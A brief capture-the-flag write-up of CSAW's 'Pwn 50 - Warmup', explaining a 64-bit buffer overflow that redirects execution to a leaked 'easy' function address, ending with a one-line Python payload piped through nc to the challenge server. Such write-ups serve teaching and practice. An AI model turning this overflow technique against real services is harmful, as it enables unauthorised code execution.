# Pwn 50 - Warmup

> Writeup by feignix (Paras Chetal)

This was a pretty basic challenge based on the buffer overflow vulnerability. Running the binary, we see that it gives us an address(_0x40060d_) and then waits for user input. On giving too big an input, the program crashes.

On analyzing the disassembly using `objdump -d warmup`, it was clear that I needed to execute the `easy` function. In fact the address which was output on running the program was of this function itself. Remember that the addresses are 8 bytes long for the 64bit binary and have to be put in little endian format. Running the following gives us the flag:

## [Exploit code]

`python -c "print('\x0d\x06\x40\x00\x00\x00\x00\x00'*10)" | nc pwn.chal.csaw.io 8000`
